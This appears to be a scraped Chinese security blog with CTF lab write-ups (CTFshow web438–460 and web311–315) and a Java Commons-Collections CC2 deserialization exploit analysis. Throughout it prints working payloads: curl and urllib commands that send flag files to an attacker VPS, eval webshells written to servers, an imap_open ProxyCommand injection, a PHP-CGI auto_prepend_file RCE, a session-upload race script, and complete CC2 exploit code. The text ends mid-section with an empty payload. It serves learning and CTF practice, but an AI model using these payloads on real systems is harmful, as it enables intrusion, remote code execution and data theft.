是一个字典，记录了所有已加载的模块。键为模块名，值为模块对象 将 sys.modules[‘模块名’] 设为 None，可以让 Python 认为该模块已被加载，但实际值为 None。这会导致后续 import 该模块时，不再真正加载，而是返回 None（或者报错） 这时我们就不能用reload了，因为 Python 会在 sys.modules 里查找，发现值为 None，而不是模块对象，于是 import 或 reload 过程中会抛出 ModuleNotFoundError 异常 我们可以用shutil模块的copy函数把os.py复制到一个新文件下，然后重新导入新模块即可 POST传入 1code=str(exec(globals()[list(globals().keys())[True-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)]].args.get(globals()[list(globals().keys())[True-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)]].method))) GET传入 1?POST=import shutil;shutil.copy('/usr/local/lib/python3.8/os.py','a.py');import a;a.system('curl http://你的vps地址:端口?p=`cat /flag`') web449这题把sys模块和importlib模块都禁用了，而且还删除了sys模块。之前的方法用不了 我们可以用urllib模块来发送网络请求，带出flag。urllib 是 Python 的一个标准库模块，用于处理和操作网页 URL，以及通过网络请求获取网页内容等功能。 主要功能 urllib.request：用于打开和读取 URL，发送 HTTP/HTTPS 请求，并获取响应内容 urllib.error：包含 urllib.request 相关的异常处理，如请求失败时的错误 urllib.parse：用于解析 URL，包括分解和构造 URL 的各个部分 urllib.robotparser：解析和处理网站的 robots.txt 文件，判断哪些网页允许爬取 POST传入 1code=str(exec(globals()[list(globals().keys())[True-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)]].args.get(globals()[list(globals().keys())[True-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)-(-True)]].method))) GET传入 1?POST=a=open('/flag').read();from urllib.request import urlopen;urlopen('http://你的vps地址:端口?p='%2Ba) %2B表示加号，如果直接写加号会无法解析，需要先URL编码 web450 题目说执行phpinfo就可以拿到flag，看代码可知我们只要满足这个正则匹配即可执行代码，我们简单分析一下 ^ 和 $ 是锚点，表示匹配字符串的开始和结束 [a-z]+ 表示匹配一个或多个小写英文字母 [\\^] 表示匹配一个脱义的插入符号 ^ 举个例子，也就是abc^def^ghi，满足正则匹配只要在中间加两个^即可。两个相同的字符异或，得到0，0和另一个字符异或，得到的便是另一个字符 payload： 1?ctfshow=phpinfo^phpinfo^phpinfo 然后搜索flag web451 这题把phpinfo过滤了。前面提到，两个相同的字符异或，得到0，0和另一个字符异或，得到另一个字符，所以我们两两修改一下就好 payload： 1?ctfshow=aaabbbb^phpbbbb^aaainfo web452 这题过滤了挺多东西，但操作空间依然很大，直接执行代码就可以 1?ctfshow=echo `ls /`; 然后读取flaag payload： 1?ctfshow=echo `cat /flaag`; 后面在网上看了其他方法，可以用括号包住进行字符串拼接 1(php.info)(); web453打开网站查看源代码，可以看到提示 我们GET传入 1/ctf/show?s=XXX POST传入 1s=index.php 然后查看网页源码，可以看到index.php代码，下面展示部分代码 123456789101112131415161718192021222324class ctf{ public function show($request,$response){ $response-&gt;header('Content-Type', 'text/html; charset=utf-8'); $s=$request-&gt;post['s']; if(isset($s)){ $response-&gt;end(file_get_contents($s)); }else{ $response-&gt;end('s not found'); } } public function file($request,$response){ $response-&gt;header('Content-Type', 'text/html; charset=utf-8'); $s=$request-&gt;post['s']; if(isset($s)){ file_put_contents('shell.php', $s); $response-&gt;end('file write done in /var/www/shell.php'); }else{ $response-&gt;end('s not found'); } } public function exec($request,$response){ system('php shell.php'); $response-&gt;end('command exec done'); } 也就是我们访问路径/ctf/file，然后POST传入内容，就会被写进shell.php。接着再访问路径/ctf/exec就可以执行shell.php的代码 同样的，我们用curl外带执行系统命令即可 首先GET传入 1/ctf/file POST传入 1s=&lt;?php system('curl http://你的vps地址:端口?p=`cat f*`');?&gt; 然后访问路径/ctf/exec，最后在服务器查看结果即可 web454跟上题一样，我们先查看源码 123456789101112131415161718192021222324class ctf{ public function show($request,$response){ $response-&gt;header('Content-Type', 'text/html; charset=utf-8'); $s=$request-&gt;post['s']; if(isset($s)){ $response-&gt;end(file_get_contents($s)); }else{ $response-&gt;end('s not found'); } } public function file($request,$response){ $response-&gt;header('Content-Type', 'text/html; charset=utf-8'); $s=$request-&gt;post['s']; if(isset($s)){ file_put_contents('shell.php', $s); $response-&gt;end('file write done in /var/www/shell.php'); }else{ $response-&gt;end('s not found'); } } public function include($request,$response){ include('shell.php'); $response-&gt;end('include done'); } 这题把system换成include了，方法跟之前一样，只是最后的路径要改一下 GET传入 1/ctf/file POST传入 1s=&lt;?php system('curl http://你的vps地址:端口?p=`cat f*`');?&gt; 然后访问路径/ctf/include，最后在服务器查看结果即可 web455查看源码，这题比上题多了个reload函数，但是用处不大。同时include函数也改回exec函数了，可以用回web453的方法 12345public function reload($request,$response){ global $http; $http-&gt;reload(); $response-&gt;end('reload done'); } GET传入 1/ctf/file POST传入 1s=&lt;?php system('curl http://你的vps地址:端口?p=`cat f*`');?&gt; 然后访问路径/ctf/exec，最后在服务器查看结果 web456除去reload函数，这题源码相比web453没怎么变，就只是改了end信息，因此可以继续用之前的方法 GET传入 1/ctf/file POST传入 1s=&lt;?php system('curl http://你的vps地址:端口?p=`cat f*`');?&gt; 然后访问路径/ctf/exec，最后在服务器查看结果 web457我们看看admin类 123456class admin extends user{ public function check(){ $u= call_user_func($this-&gt;password); return $u=='admin'; }} 简单分析一下 check() 中调用了 call_user_func($this-&gt;password)： call_user_func 用于调用回调函数，参数可以是函数名字符串或可调用变量 这里 $this-&gt;password 被当成函数名调用，函数执行的结果赋给 $u 最后判断 $u 是否等于 'admin'，相等则返回 true，否则返回 false 因此我们传入p=phpinfo触发函数使其返回值为True即可，然后传入u=admin payload： 1?u=admin&amp;p=phpinfo web458这题改为$u==='admin'，变成强比较了 123456class admin extends user{ public function check(){ $u= call_user_func($this-&gt;password); return $u==='admin'; }} 因为类名为admin，我们可以给p传入get_class获取类名，然后再传入u=admin，就满足条件了 payload： 1?u=admin&amp;p=get_class web459 这题用了copy函数，PHP 中的copy()函数是用于复制文件的内置函数 语法 1bool copy ( string $source , string $dest [, resource $context ] ) $source：必需，要复制的源文件路径 $dest：必需，目标文件路径（包含文件名） $context：可选的上下文资源 我们用php伪协议即可 payload： 1?u=php://filter/read=convert.base64-encode/resource=flag.php&amp;p=1 然后访问路径/1.php读取flag的base64编码，解码即可 web460这题跟web449相比，多了一些时间检测的代码，我们看看关键部分 1234@func_set_timeout(0.7)def run(s): time.sleep(randmon.random()) return eval(s) 12345try: s=run(code) return sexcept func_timeout.exceptions.FunctionTimedOut: return exec('1') 有两个区别 1. 执行超时机制 使用了 func-timeout 库，为 run 函数设置了 0.7 秒的超时限制。这意味着如果传入的 code 执行时间超过 0.7 秒，程序会抛出 FunctionTimedOut 异常，从而中断执行 2. 随机延迟 在 run 函数中，执行 eval 之前有一个 time.sleep(random.random())。这会增加一个 0 到 1 秒之间的随机延迟 算上随机延迟，也就是我们传入的代码必须要执行时间小于0.7s 这题有些难，参考网上Y4tacker师傅的做法，可以配合urllib外带数据 payload： 12345678910111213141516171819202122232425262728293031def getNumber3(number): number = int(number) if number in [-2, -1, 0, 1]: return [&quot;~int(True)&quot;, &quot;~int(False)&quot;, &quot;int(False)&quot;, &quot;int(True)&quot;][number + 2] if number % 2: return &quot;~%s&quot; % getNumber3(~number) else: return &quot;(%s&lt;&lt;(int(True)))&quot; % getNumber3(number / 2)def getNumber2(number): number = int(number) if number in [-2, -1, 0, 1]: return [&quot;~([]&lt;())&quot;, &quot;~([]&lt;[])&quot;, &quot;([]&lt;[])&quot;, &quot;([]&lt;())&quot;][number + 2] if number % 2: return &quot;~%s&quot; % getNumber2(~number) else: return &quot;(%s&lt;&lt;([]&lt;()))&quot; % getNumber2(number / 2)s = 'import urllib.request;import ssl;f=open(&quot;/flag&quot;).read();context = ssl._create_unverified_context();url = &quot;http://你的vps地址:端口?p=&quot;+f;request = urllib.request.Request(url);response = urllib.request.urlopen(url=request,context=context)'res = 'str().join(['for i in s: res += f&quot;chr({getNumber3(ord(i))}),&quot;res = res[:-1]res += '])'print(&quot;exec(&quot;+res+&quot;)&quot;) 把结果拼接进Body然后POST发送 1code=你的代码运行结果 简单解释一下这个代码 1s = 'import urllib.request;import ssl;f=open(&quot;/flag&quot;).read();context = ssl._create_unverified_context();url = &quot;http://你的vps地址:端口?p=&quot;+f;request = urllib.request.Request(url);response = urllib.request.urlopen(url=request,context=context)' import urllib.request：导入用于打开和读取 URL 的模块 import ssl：导入处理 TLS/SSL 连接的模块 f = open(&quot;/flag&quot;).read()：打开根目录下的 flag 文件，读取内容，并赋值给变量 f context = ssl._create_unverified_context()：创建一个不验证 SSL 证书的上下文环境，避免因证书问题阻塞请求 request = urllib.request.Request(url)：创建针对该 URL 的 HTTP 请求 response = urllib.request.urlopen(url=request, context=context)：发送请求并获取响应，使用前面创建的 SSL 上下文 参考yu22x：CTFSHOW其他篇 Y4tacker：[CTFSHOW]CTFSHOW-其他WP","link":"/posts/ctfshow-others-3-web438-web460/"},{"title":"Java反序列化 CC2链分析","text":"环境准备CC2使用的是PriorityQueue和javassist来构造利用链，且对jdk版本要求没这么严格了，这里我继续沿用之前做CC1用的jdk8u-65 然后用的是commons-collections 4.0，因为只有4.0版本开始，TransformingComparator才支持序列化，从而能够被序列化流利用，完成包括通过PriorityQueue触发执行链的步骤 修改pom.xml文件 123456789101112&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.commons&lt;/groupId&gt; &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt; &lt;version&gt;4.0&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.javassist&lt;/groupId&gt; &lt;artifactId&gt;javassist&lt;/artifactId&gt; &lt;version&gt;3.22.0-GA&lt;/version&gt; &lt;/dependency&gt;&lt;/dependencies&gt; 然后在Maven同步项目即可 利用链1初步探索首先我们讲链1，这条链不需要用到Javassist，会简单一些 反序列化入口地点为PriorityQueue.readObject() 最后调用了heapify()方法，继续跟进看看 &gt;&gt;&gt;是无符号右移，&gt;&gt;是有符号右移，size &gt;&gt;&gt; 1表示将变量 size 的二进制位整体向右移动1位，也就是除以二保留整数。又因为要求i &gt;= 0，也就是size除以2保留整数然后减一要大于等于0，计算得到i &gt;= 2才可以进入循环，这个要记住，后面会用到 发现调用siftDown()方法，继续跟进 可以看到有两个方法，我们先跟进siftDownUsingComparator 调用了comparator.compare()方法，跟进comparator看看定义 继续查看Comparator，发现是个接口，compare是它的抽象方法 接下来就是查找有哪些类实现了compare方法且可以被后续利用，发现TransformingComparator类符合要求 调用了transformer.transform()，接下来就跟CC1剩下的步骤一样，用InvokerTransformer.transform()来调用危险函数 我们先看看CC1的利用链，如果忘记了如何构造链子可以看Java反序列化 CC1链分析 再看看我们构造的CC2链 从ChainedTransformer.transform()一直到后面都是一样的，那我们可以先尝试构造代码 1234567891011121314151617181920212223242526272829303132public class Main { public static void main(String[] args) throws Exception { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class, Class[].class}, new Object[]{&quot;getRuntime&quot;, null}), new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{&quot;calc&quot;}), }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); TransformingComparator transformingComparator = new TransformingComparator(chainedTransformer); PriorityQueue queue = new PriorityQueue(1, transformingComparator); // 因为要i &gt;= 2，所以add两个 queue.add(1); queue.add(2); try{ ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(&quot;cc2.ser&quot;)); objectOutputStream.writeObject(queue); objectOutputStream.close(); }catch (Exception e){ e.printStackTrace(); } try{ ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(&quot;cc2.ser&quot;)); objectInputStream.readObject(); objectInputStream.close(); }catch (Exception e){ e.printStackTrace(); } }} 但是如果运行的话，会直接弹出两个计算器，而且我们想要的cc2.ser也没有生成 终端还弹出了个异常 那我们怎么解决，接下来深入分析一下 逐步完善先讲讲异常，PriorityQueue在 Java 中要求元素要么实现 Comparable 接口，要么在构造时提供 Comparator，但是由于Runtime.exec返回ProcessImpl实例，因此TransformingComparator的transform返回的是ProcessImpl，不是Comparable，所以抛出ClassCastException，后面调试时也可以看到 问AI解释如下 接下来就是为什么不生成cc2.ser，我们在PriorityQueue的add函数打个断点调试 当执行到queue.add(2)，offer()进入了else分支 继续跟进，因为comparator不为null，进入siftUpUsingComparator方法 继续跟，可以看到调用了comparator.compare() 再次跟进，发现调用了transformer.transform，两个transform对应弹出两个计算器 接下来调用decorated.compare来比较，但是因为两个都是ProcessImpl，无法比较，所以抛出异常结束 这也就导致后面的序列化和反序列化无法正常执行，因此我们要想办法绕过siftUpUsingComparator方法，让其先不要这么早抛出错误 由前面可知，当comparator为null会进入siftDownComparable方法，我们跟进看一下 可以看到最后进行了赋值操作，没有调用compare方法。那我们可以把queue的comparator参数先去掉，让其先不要进入siftUpUsingComparator方法，然后通过反射给comparator赋值即可 123Field field = Class.forName(&quot;java.util.PriorityQueue&quot;).getDeclaredField(&quot;comparator&quot;);field.setAccessible(true);field.set(queue, transformingComparator); 这次成功进入siftUpComparable方法 后面也是成功执行序列化和反序列化 最终利用综上，我们得到完整exp 12345678910111213141516171819202122232425262728293031323334public class Main { public static void main(String[] args) throws Exception { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class, Class[].class}, new Object[]{&quot;getRuntime&quot;, null}), new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{&quot;calc&quot;}), }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); TransformingComparator transformingComparator = new TransformingComparator(chainedTransformer); PriorityQueue queue = new PriorityQueue(1); queue.add(1); queue.add(2); Field field = Class.forName(&quot;java.util.PriorityQueue&quot;).getDeclaredField(&quot;comparator&quot;); field.setAccessible(true); field.set(queue, transformingComparator); try{ ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(&quot;cc2.ser&quot;)); objectOutputStream.writeObject(queue); objectOutputStream.close(); }catch (Exception e){ e.printStackTrace(); } try{ ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(&quot;cc2.ser&quot;)); objectInputStream.readObject(); objectInputStream.close(); }catch (Exception e){ e.printStackTrace(); } }} 利用链2接下来就是第二条利用链，需要用到Javassist来动态创建类，这条链比第一条要难上一些，我们逐步分析 什么是JavassistJavassist是一个开源的Java字节码操作库，主要用于在Java程序中动态创建和修改类。它的特点是使用简单，开发者不需要深入了解虚拟机指令，能够像写Java代码一样直接插入代码片段来动态生成新类或改变已有类的结构。换句话说，Javassist确实是一个可以动态创建类的工具库，它允许在运行时生成类的字节码并加载到JVM中，支持添加字段、方法、构造函数等操作，实现动态字节码修改和类的动态定义 举个例子 123456ClassPool pool = ClassPool.getDefault();CtClass cc = pool.get(&quot;Hello&quot;);CtMethod m = cc.getDeclaredMethod(&quot;say&quot;);m.insertBefore(&quot;{ System.out.println(\\&quot;Hello.say():\\&quot;); }&quot;);Class clazz = cc.toClass();Object obj = clazz.newInstance(); 这里，Hello类的say方法被插入打印语句，随后调用toClass()，把修改后的类加载成Java类，并创建其实例 需要知道的是，用makeClassInitializer()插入代码，最终生成的类就有static块，存在静态初始化方法的类，在该类首次被加载并初始化时执行一次，如反射、创建实例、访问静态成员等，该方法都会被自动调用。先记住，我们后面会用到 过程分析这条链的核心是TemplatesImpl类的newTransformer()方法 我们看到有个getTransletInstance()方法，跟进去看看 当_name不为null且_class等于null时，会执行函数defineTransletClasses()，继续跟进去看看 要求_bytecodes不为null，然后通过loader.defineClass()将字节数组还原成Class对象，接着尝试获取父类，检测是否为ABSTRACT_TRANSLET，通过则_transletIndex = i 最后回到getTransletInstance()方法继续执行，将我们动态创建的类实例化，并执行写入的static代码 代码构造我们回到一开始，反序列化的入口为PriorityQueue.readObject()，刚开始的构造步骤跟链1一样，就不细讲了，这里放个我自己简单做的图，可以快速回忆一下 不同的是InvokerTransformer类这里，我们不是直接调用Runtime执行命令，而是要在这里调用TemplatesImpl的newTransformer()方法，因此需要传入iMethodName，我们看看InvokerTransformer的构造器 是private方法，接下来就是通过反射来实现，构建代码如下 123Constructor invokerTransformerConstructor = InvokerTransformer.class.getDeclaredConstructor(String.class);invokerTransformerConstructor.setAccessible(true);InvokerTransformer transformer = (InvokerTransformer) invokerTransformerConstructor.newInstance(&quot;newTransformer&quot;); 然后把链1传给TransformingComparator的参数改一下，传入我们写的transformer 12TransformingComparator transformingComparator = new TransformingComparator(transformer);PriorityQueue queue = new PriorityQueue(1); 为了后面能方便地通过反射修改私有字段，我们写一个函数 12345public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception { final Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value);} 接下来就要用到Javassist了，构造代码如下 12345678910111213141516// 获取javassist类池，插入AbstractTranslet类所在的路径，然后创建新的空类EvilClassPool pool = ClassPool.getDefault();pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));CtClass cc = pool.makeClass(&quot;Evil&quot;);// 在静态初始化块中插入恶意命令代码，需要用到 makeClassInitializer()String cmd = &quot;java.lang.Runtime.getRuntime().exec(\\&quot;calc.exe\\&quot;);&quot;;cc.makeClassInitializer().insertBefore(cmd);// 继承AbstractTranslet类cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));// 避免文件名重复String rename = &quot;Evil&quot; + System.nanoTime();cc.setName(rename);cc.writeFile();// 将动态类转为字节码byte数组byte[] bytes = cc.toBytecode();byte[][] targetByteCodes = new byte[][]{bytes}; 实例化之后效果如下 接着根据我们前面的分析过程，尝试实例化TemplatesImpl()并修改相关字段，_bytecodes为前面Javassist那里写的targetByteCodes恶意字节码 1234TemplatesImpl templates = new TemplatesImpl();setFieldValue(templates, &quot;_name&quot;, &quot;test&quot;);// 随便传个值，不为null就可以setFieldValue(templates, &quot;_class&quot;, null);setFieldValue(templates, &quot;_bytecodes&quot;, targetByteCodes); 然后对于TransformingComparator.compare()的obj1，我们传入实例化的TemplatesImpl，也就是templates，obj2就随便传个1。同样的，我们也是通过反射来设置，绕过add()方法，直接构建反序列化所需的状态 1234Object[] array = new Object[]{templates, 1};setFieldValue(queue, &quot;queue&quot;, array);setFieldValue(queue, &quot;size&quot;, 2);setFieldValue(queue, &quot;comparator&quot;, transformingComparator); 最后，我们画个图来直观感受一下 最终利用把前面的代码整理合并一起，得到完整exp 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354public class Main { public static void main(String[] args) throws Exception { ClassPool pool = ClassPool.getDefault(); pool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = pool.makeClass(&quot;Evil&quot;); String cmd = &quot;java.lang.Runtime.getRuntime().exec(\\&quot;calc.exe\\&quot;);&quot;; cc.makeClassInitializer().insertBefore(cmd); cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); String rename = &quot;Evil&quot; + System.nanoTime(); cc.setName(rename); cc.writeFile(); byte[] bytes = cc.toBytecode(); byte[][] targetByteCodes = new byte[][]{bytes}; Constructor invokerTransformerConstructor = InvokerTransformer.class.getDeclaredConstructor(String.class); invokerTransformerConstructor.setAccessible(true); InvokerTransformer transformer = (InvokerTransformer) invokerTransformerConstructor.newInstance(&quot;newTransformer&quot;); TransformingComparator transformingComparator = new TransformingComparator(transformer); PriorityQueue queue = new PriorityQueue(1); TemplatesImpl templates = new TemplatesImpl(); setFieldValue(templates, &quot;_name&quot;, &quot;test&quot;); setFieldValue(templates, &quot;_class&quot;, null); setFieldValue(templates, &quot;_bytecodes&quot;, targetByteCodes); Object[] array = new Object[]{templates, 1}; setFieldValue(queue, &quot;queue&quot;, array); setFieldValue(queue, &quot;size&quot;, 2); setFieldValue(queue, &quot;comparator&quot;, transformingComparator); try{ ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(&quot;cc2.ser&quot;)); objectOutputStream.writeObject(queue); objectOutputStream.close(); }catch (Exception e){ e.printStackTrace(); } try{ ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(&quot;cc2.ser&quot;)); objectInputStream.readObject(); objectInputStream.close(); }catch (Exception e){ e.printStackTrace(); } } public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception { final Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); }} 验证一下，成功执行 总结这次的审计相比CC1更快了，多阅读代码对自己帮助挺大的，同时一通审计下来发现思路真的很妙，很惊叹CC链作者的脑洞，还得继续努力，加油","link":"/posts/java-cc2-gadget-chain-analysis/"},{"title":"CTFSHOW | phpCVE题解 web311 - web315","text":"题目列表web311打开题目环境，先看看题目使用了什么语言和服务，F12打开网络，或者用Wappalyer查看 可以看到目标环境为 Nginx + PHP-FPM，且PHP版本为7.1 上网搜索对应的漏洞，发现CVE-2019-11043符合我们的要求 具体可以参考链接：https://cloud.tencent.com/developer/article/1530703 漏洞描述 CVE-2019-11043 是一个重要的 PHP-FPM 远程代码执行漏洞，主要影响配置不当的 Nginx + PHP-FPM 网站，攻击者可利用该漏洞执行任意 PHP 代码，进而控制目标服务器 向Nginx + PHP-FPM的服务器 URL发送 %0a 时，服务器返回异常 该漏洞需要在nginx.conf中进行特定配置才能触发，具体配置如下： 12345678910111213location ~ [^/]\\.php(/|$) { ... fastcgi_split_path_info ^(.+?\\.php)(/.*)$; fastcgi_param PATH_INFO $fastcgi_path_info; fastcgi_pass php:9000; ...} 当用户在请求路径中插入编码为 %0a 的换行符，Nginx 的正则处理会使 PATH_INFO 为空。传递给 PHP-FPM 后，由于变量长度与内容可被精确控制，进而影响内存布局，使攻击者可构造特殊的 FastCGI 参数（如可控伪造 PHP_VALUE） 影响范围 在 Nginx + PHP-FPM 环境下，当启用了上述 Nginx 配置后，以下 PHP 版本受本次漏洞影响，另外，PHP 5.6版本也受此漏洞影响，但目前只能 Crash，不可以远程代码执行： PHP 7.0 PHP 7.1 PHP 7.2 PHP 7.3 这题要用到的工具是phuip-fpizdam，项目地址：https://github.com/neex/phuip-fpizdam 该工具是基于Go语言构建的，需要先搭建好环境 12345678#更新本地软件包apt-get update#安装Goapt install golang#验证go -version 然后github下载工具 12345678#克隆项目到本地git clone https://github.com/neex/phuip-fpizdam.git#进入工具目录cd phuip-fpizdam#获取依赖包和编译代码go get -v &amp;&amp; go build 然后使用工具执行命令，地址换成自己的 1go run . &quot;http://d654f5bf-2024-4d68-a045-c216dba47a44.challenge.ctf.show/index.php&quot; 最后返回题目，在/index.php?a=执行命令即可，如果没反应就多执行几次 flag在fl0gHe1e.txt里面，执行/index.php?a=cat fl0gHe1e.txt即可 web312打开题目，可以看到一个邮箱登录框 目标环境为Nginx和PHP5.6.38 网上搜索一番，发现CVE-2018-19518符合我们的要求 参考链接：https://blog.csdn.net/weixin_45605352/article/details/116517889 什么是IMAP IMAP（Internet Message Access Protocol，互联网邮件访问协议）是一种用于从邮件服务器远程访问和管理电子邮件的标准协议。与传统的POP3不同，IMAP允许用户在多个设备上同步邮箱状态，邮件内容保留在服务器上，用户对邮件的操作如读取、删除都会实时反馈到服务器，便于多设备协同管理邮箱，实现更灵活和在线的邮件访问体验，通常端口是143 漏洞描述 CVE-2018-19518是PHP IMAP远程命令执行漏洞，漏洞存在于PHP IMAP扩展的imap_open()函数，该函数用于连接IMAP邮件服务器，受到影响的环境通常运行在类Unix系统上，PHP通过imap_open连接远程IMAP服务时会调用底层rsh命令尝试连接 漏洞成因 imap_open()函数中，IMAP服务器名称作为参数传递给rsh（远程shell）命令，在部分系统中，rsh命令被替换为ssh（比如Debian、Ubuntu），而ssh支持更多复杂的命令参数。攻击者可以在构造的IMAP服务器名称中注入-oProxyCommand=参数，这些参数被ssh解释执行，从而执行任意系统命令 imap_open(string $mailbox , string $username , string $password)函数中的mailbox是执行命令参数的一部分，所以我们可以通过更改邮箱名来进行命令注入执行 影响范围 漏洞影响PHP多个版本，包括5.6.0至5.6.38，7.0.0至7.0.32，7.1.0至7.1.24，7.2.0至7.2.12等版本 现在回到题目，先随便输入几个数，看看表单数据 可以看到这里POST上传了三个参数，因为imap_open(string $mailbox , string $username , string $password)函数中的mailbox是执行命令参数的一部分，所以我们可以通过更改它来进行命令注入执行 原始payload： 1x+-oProxyCommand=echo echo '&lt;?php eval($_POST[1]);' &gt; /var/www/html/1.php|base64 -d|sh} 对内容进行base64编码，符号进行URL编码，%3d是等号，%09是制表符 1x+-oProxyCommand%3decho%09ZWNobyAnPD9waHAgZXZhbCgkX1BPU1RbMV0pOycgPiAvdmFyL3d3dy9odG1sLzEucGhw%3d|base64%09-d|sh} 最终payload： 1hostname=x+-oProxyCommand%3decho%09ZWNobyAnPD9waHAgZXZhbCgkX1BPU1RbMV0pOycgPiAvdmFyL3d3dy9odG1sLzEucGhw%3d|base64%09-d|sh}&amp;username=111&amp;password=222 显示下面结果即为成功 然后蚁剑连接webshell 成功找到flag web313打开题目，先看看目标环境 也是Nginx + PHP，且PHP版本为5.4.1，上网搜索对应可能的漏洞，发现CVE-2012-1823符合我们的要求 参考链接：https://www.cnblogs.com/lthlsy/p/14820076.html 漏洞描述 CVE-2012-1823 是 PHP-CGI 远程代码执行漏洞，主要出现在 PHP-CGI 模式下。该模式下 PHP 响应 HTTP 请求的方式存在缺陷，导致攻击者能够通过特别构造的 URL 参数，动态修改 PHP 的运行时配置 漏洞成因 漏洞来源于 PHP-CGI 对命令行参数的处理不严谨，攻击者可以在 URL 中插入以 -d 开头的参数（如 -d allow_url_include=1 -d auto_prepend_file=php://input），这些参数本应只由命令行传递，却被 PHP-CGI 错误地解析为运行配置。这就允许攻击者开启危险功能，或通过指定 auto_prepend_file 使 PHP 在执行时读取并执行 HTTP 请求体中的恶意代码，从而实现远程执行任意 PHP 代码 影响范围 该漏洞影响 PHP 5.3.x 和 5.4.x 的早期版本（PHP &lt; 5.3.12 ，PHP &lt; 5.4.2），尤其是在使用 CGI 模式处理请求的环境中更易受害。生产环境中，许多使用 Nginx 反向代理 PHP-CGI 的站点因未做适当配置而成为攻击目标 CGI模式下有如下可控命令行参数可用 12345678910111213-c 指定php.ini文件的位置-n 不要加载php.ini文件-d 指定配置项-b 启动fastcgi进程-s 显示文件源码-T 执行指定次该文件-h和-? 显示帮助 可以用-s显示文件源码 证明确实存在该漏洞，接下来就是执行payload了 1/index.php?-d+allow_url_include=1+-d+auto_prepend_file=php://input URL编码，%3d是等号，%3a是冒号 1/index.php?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp%3a//input 然后请求体写PHP代码执行命令 1&lt;?php echo system(&quot;ls&quot;);?&gt; 最后在/somewhere找到flag web314打开题目，可以看到给出了源码，但是由于禁了冒号，没办法用伪协议 可以正常读取文件 扫描目录，发现有个/phpinfo.php，题目里的源码注释也有提示 拼接进URL访问，发现开启了session，且session.name为PHPSESSID 可以用PHP_SESSION_UPLOAD_PROGRESS进行文件包含，用到条件竞争 payload： 12345678910111213141516171819202122232425262728293031323334import requestsimport ioimport threadingurl = 'http://b14a333f-6a35-4dea-b3e3-d016a1f023b2.challenge.ctf.show/'file_name=&quot;/var/www/html/1.php&quot;file_content='&lt;?php eval($_POST[1]);?&gt;'def write(session): data = { 'PHP_SESSION_UPLOAD_PROGRESS':f&quot;&lt;?php echo 'success!'; file_put_contents('{file_name}','{file_content}');?&gt;&quot; } while event.isSet(): f = io.BytesIO(b'a'*1024*50) session.post(url,cookies={'PHPSESSID':'hello'},data=data,files={'file':('xxx',f)})def read(session): while event.isSet(): response = session.post(url+'?f=/tmp/sess_hello') if 'success!' in response.text: print(&quot;写入成功，访问1.php getshell&quot;) event.clear() break else: passif __name__=='__main__': event = threading.Event() event.set() with requests.session() as session: for i in range(10): threading.Thread(target=write,args=(session,)).start() for i in range(10): threading.Thread(target=read,args=(session,)).start() 显示写入成功即可 蚁剑连接webshell 在根目录成功找到flag 还有一个方法就是用UA头进行日志文件包含 URL拼接参数?f=/var/log/nginx/access.log，然后UA头写入&lt;?php eval($_POST[1]);?&gt;，最后Body写入命令POST发送执行即可 执行命令得到flag web315题目提示debug开启，端口9000 上网搜了一下对应漏洞，发现XDebug 远程调试漏洞符合我们的要求 参考链接：https://blog.csdn.net/zy15667076526/article/details/111824491 XDebug 远程调试漏洞是一种因XDebug扩展的远程调试功能配置不当而引发的严重安全风险。XDebug是PHP的一个调试扩展，主要帮助开发者远程调试PHP代码，比如通过IDE连接服务器进行代码断点调试。当XDebug开启远程调试且配置了xdebug.remote_connect_back=1（或在新版XDebug中对应的xdebug.discover_client_host=1），XDebug会自动尝试连接发起HTTP请求客户端的IP地址以建立调试会话 这个自动“回连”机制如果暴露在公网环境中，我们访问http://target/index.php?XDEBUG_SESSION_START=phpstorm，目标服务器的XDebug将会连接访问者的IP（或X-Forwarded-For头指定的地址）。连接建立后，攻击者可以通过调试协议(DBGp)主动执行PHP代码，利用该功能中的eval接口实现任意代码执行（RCE）。由于XDebug调试协议没有身份验证，攻击者几乎可以完全控制运行PHP代码的服务器进程 我们可以输入/index.php?XDEBUG_SESSION_START=phpstorm验证一下 响应头中出现了 Set-Cookie: XDEBUG_SESSION=phpstorm，这表示服务器上的 PHP 在启用了 XDebug 调试扩展，并且远程调试功能被激活了，因此可以判断漏洞存在 这个漏洞的利用要用到脚本，可以命名为exp.py payload： 